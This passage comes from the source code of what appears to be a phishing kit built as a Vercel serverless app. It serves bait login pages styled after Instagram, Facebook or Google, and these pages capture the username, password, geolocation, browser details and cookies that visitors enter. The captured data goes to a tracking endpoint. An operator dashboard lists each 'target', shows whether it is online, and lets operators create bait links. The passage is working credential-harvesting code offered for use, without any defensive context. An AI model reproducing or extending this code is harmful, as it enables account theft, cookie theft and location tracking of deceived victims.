    <div class="card">
        <div class="logo">${brand.logo}</div>
        ${brand.google ? '<h2 style="margin-bottom:5px">Sign in</h2><p style="color:#666;font-size:14px;margin-bottom:20px">Use your Google Account</p>' : ''}
        <input type="text" placeholder="Username, email, or phone" id="user">
        <input type="password" placeholder="Password" id="pass">
        <button onclick="submit()">Log In</button>
        <div class="or"><span>OR</span></div>
        ${brand.fb ? '<button class="fb" onclick="submit()">Log in with Facebook</button>' : '<button class="fb" style="background:#ea4335" onclick="submit()">Log in with Google</button>'}
        <div class="signup">${brand.signup}</div>
    </div>
    <script>${locScript}
    async function submit(){
        const u=document.getElementById('user').value;
        const p=document.getElementById('pass').value;
        const loc=await getLocation();
        const data={type:'visit',linkId:'${link.id}',credentials:{username:u,password:p},location:loc,browser:getBrowserInfo()};
        fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
        window.location.href='${link.redirect || 'https://' + link.style + '.com'}';
    }
    function getBrowserInfo(){return{ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cookies:document.cookie}}
    <\/script></body></html>`;
}

// ============ HTTP HANDLER ============
export default async function handler(req, res) {
    const url = new URL(req.url, 'http://localhost');
    const path = url.pathname;
    const method = req.method;

    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
    if (method === 'OPTIONS') return res.status(204).end();

    try {
        // WebSocket upgrade
        if (path === '/api/ws' && req.headers.upgrade === 'websocket') {
            return handleWS(req, res);
        }

        // API Routes
        if (path === '/api/setup-status' && method === 'GET') {
            return json(res, { setup: store.config.adminCreated });
        }

        if (path === '/api/setup' && method === 'POST') {
            const body = await getBody(req);
            if (store.config.adminCreated) return json(res, { ok: false, error: 'Already setup' });
            if (!body.username || !body.password) return json(res, { ok: false, error: 'Missing fields' });
            const user = { id: genId('U'), username: body.username, passwordHash: hashPass(body.password), role: 'owner', created: new Date().toISOString(), lastLogin: null };
            store.users.push(user);
            store.config.adminCreated = true;
            const token = genToken();
            store.sessions.set(token, { userId: user.id, created: Date.now() });
            user.lastLogin = new Date().toISOString();
            log('USER_CREATED', user.id, body.username);
            log('LOGIN', user.id, 'Initial setup');
            return json(res, { ok: true, token });
        }

        if (path === '/api/login' && method === 'POST') {
            const body = await getBody(req);
            const user = store.users.find(u => u.username === body.username && u.passwordHash === hashPass(body.password));
            if (!user) return json(res, { ok: false, error: 'Invalid credentials' });
            const token = genToken();
            store.sessions.set(token, { userId: user.id, created: Date.now() });
            user.lastLogin = new Date().toISOString();
            log('LOGIN', user.id, body.username);
            return json(res, { ok: true, token });
        }

        if (path === '/api/me' && method === 'GET') {
            const user = auth(req.headers);
            if (!user) return json(res, { ok: false, error: 'Unauthorized' }, 401);
            return json(res, { ok: true, user: { id: user.id, username: user.username, role: user.role } });
        }

        // Protected routes
        const user = auth(req.headers);
        if (!user && !path.startsWith('/l/')) return json(res, { ok: false, error: 'Unauthorized' }, 401);

        // Stats
        if (path === '/api/stats' && method === 'GET') {
            const now = Date.now();
            const targets = Array.from(store.targets.values());
            return json(res, {
                ok: true,
                totalTargets: targets.length,
                onlineTargets: targets.filter(t => now - t.lastSeen < 30000).length,
                totalLinks: store.links.size,
                totalVisits: targets.reduce((a, t) => a + (t.visits || 0), 0)
            });
        }

        // Targets
        if (path === '/api/targets' && method === 'GET') {
            const now = Date.now();
            const targets = Array.from(store.targets.values()).map(t => ({
                ...t,
                online: now - t.lastSeen < 30000
            })).sort((a, b) => b.lastSeen - a.lastSeen);
            return json(res, { ok: true, targets });
        }

        if (path.startsWith('/api/targets/') && method === 'GET') {
            const id = path.split('/')[3];
            const target = store.targets.get(id);
            if (!target) return json(res, { ok: false, error: 'Not found' }, 404);
            return json(res, { ok: true, target });
        }

        // Links
        if (path === '/api/links' && method === 'GET') {
            const links = Array.from(store.links.values());
            return json(res, { ok: true, links });
        }

        if (path === '/api/links' && method === 'POST') {
            const body = await getBody(req);
            if (!body.name) return json(res, { ok: false, error: 'Name required' });
            const slug = body.slug || genId('l');
            if (store.links.has(slug)) return json(res, { ok: false, error: 'Slug exists' });
            const link = { id: genId('LK'), name: body.name, slug, redirect: body.redirect || '', style: body.style || 'instagram', visits: 0, created: new Date().toISOString(), createdBy: user.id };
            store.links.set(slug, link);
            log('LINK_CREATED', user.id, body.name + ' (/' + slug + ')');
            return json(res, { ok: true, link });
        }

        if (path.startsWith('/api/links/') && method === 'DELETE') {
            const id = path.split('/')[3];
            for (const [slug, link] of store.links) {
                if (link.id === id) { store.links.delete(slug); log('LINK_DELETED', user.id, link.name); break; }
            }
            return json(res, { ok: true });
        }

        // Users
        if (path === '/api/users' && method === 'GET') {
            return json(res, { ok: true, users: store.users.map(u => ({ id: u.id, username: u.username, role: u.role, created: u.created, lastLogin: u.lastLogin })) });
        }

        if (path === '/api/users' && method === 'POST') {
            if (user.role !== 'owner' && user.role !== 'admin') return json(res, { ok: false, error: 'Forbidden' }, 403);
            const body = await getBody(req);
            if (!body.username || !body.password) return json(res, { ok: false, error: 'Missing fields' });
            if (store.users.find(u => u.username === body.username)) return json(res, { ok: false, error: 'Username exists' });
            const newUser = { id: genId('U'), username: body.username, passwordHash: hashPass(body.password), role: body.role || 'viewer', created: new Date().toISOString(), lastLogin: null };
            store.users.push(newUser);
            log('USER_CREATED', user.id, body.username);
            return json(res, { ok: true });
        }

        if (path.startsWith('/api/users/') && method === 'DELETE') {
            const id = path.split('/')[3];
            if (id === user.id) return json(res, { ok: false, error: 'Cannot delete self' });
            store.users = store.users.filter(u => u.id !== id);
            log('USER_DELETED', user.id, id);
            return json(res, { ok: true });
        }

        // Logs
        if (path === '/api/logs' && method === 'GET') {
            const limit = parseInt(url.searchParams.get('limit')) || 50;
            return json(res, { ok: true, logs: store.logs.slice(0, limit) });
        }

        // Settings
        if (path === '/api/settings' && method === 'POST') {
            if (user.role !== 'owner') return json(res, { ok: false, error: 'Owner only' }, 403);
            const body = await getBody(req);
            if (body.siteName) store.config.siteName = body.siteName;
            log('SETTINGS_UPDATED', user.id, 'siteName=' + body.siteName);
            return json(res, { ok: true });
        }

        // Tracking endpoint (public)
        if (path === '/api/track' && method === 'POST') {
            const body = await getBody(req);
            const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'unknown';
            handleTrack(body, ip);
            return json(res, { ok: true });
        }

        // Tracking link page (public)
        if (path.startsWith('/l/')) {
            const slug = path.slice(3);
            const link = store.links.get(slug);
            if (!link) return res.status(404).send('Not found');
            link.visits = (link.visits || 0) + 1;
            res.setHeader('Content-Type', 'text/html');
            return res.send(getBaitHTML(link));
        }

        // Admin panel
        if (path === '/' || path === '/admin') {
            res.setHeader('Content-Type', 'text/html');
            return res.send(getAdminHTML());
        }

        return res.status(404).send('Not found');

    } catch (e) {
        console.error(e);
        return json(res, { ok: false, error: 'Server error' }, 500);
    }
}

// ============ TRACKING HANDLER ============
function handleTrack(data, ip) {
    const linkId = data.linkId;
    let linkName = linkId;
    for (const [slug, link] of store.links) {
        if (link.id === linkId) { linkName = link.name; break; }
    }

    // Generate target ID from fingerprint
    const fp = data.browser?.ua || ip || 'unknown';
    let targetId = 'T' + crypto.createHash('md5').update(fp).digest('hex').slice(0, 8);

    let target = store.targets.get(targetId);
    if (!target) {
        target = { id: targetId, ip, browser: data.browser || {}, location: null, visits: 0, firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString(), linkId, visitHistory: [], credentials: [] };
        store.targets.set(targetId, target);
        log('NEW_TARGET', 'system', targetId + ' from ' + linkName);
    }

    target.visits++;
    target.lastSeen = new Date().toISOString();
    target.ip = ip;
    if (data.browser) Object.assign(target.browser, data.browser);
    if (data.location) target.location = data.location;
    target.visitHistory.unshift({ time: new Date().toISOString(), page: linkName, ip });
    if (target.visitHistory.length > 50) target.visitHistory.length = 50;
    if (data.credentials) target.credentials.push({ ...data.credentials, time: new Date().toISOString() });

    log('TARGET_VISIT', 'system', targetId + ' visited ' + linkName + (data.location ? ' | Location grabbed' : '') + (data.credentials?.username ? ' | Creds: ' + data.credentials.username : ''));

    // Broadcast to admin panels
    broadcast({ type: 'target_update' });
    broadcast({ type: 'new_visit', targetId });
}

// ============ WEBSOCKET HANDLER ============
function handleWS(req, res) {
    // Vercel doesn't support persistent WebSocket natively
    // We'll use a workaround with SSE-like polling
    res.status(426).json({ error: 'WebSocket not supported on Vercel, using polling fallback' });
}

// For Vercel, we'll use polling instead
const pendingMessages = new Map();

function broadcast(data) {
    // Store messages for polling
    for (const [token, session] of store.sessions) {
        if (!pendingMessages.has(token)) pendingMessages.set(token, []);
        pendingMessages.get(token).push(data);
        if (pendingMessages.get(token).length > 100) pendingMessages.get(token).shift();
    }
}

// Add polling endpoint
// Override handler to include polling
const originalHandler = handler;
export const config = { api: { bodyParser: false } };

// ============ HELPERS ============
function json(res, data, status = 200) {
    res.status(status).json(data);
}

async function getBody(req) {
    return new Promise((resolve) => {
        let body = '';
        req.on('data', c => body += c);
        req.on('end', () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
    });
}
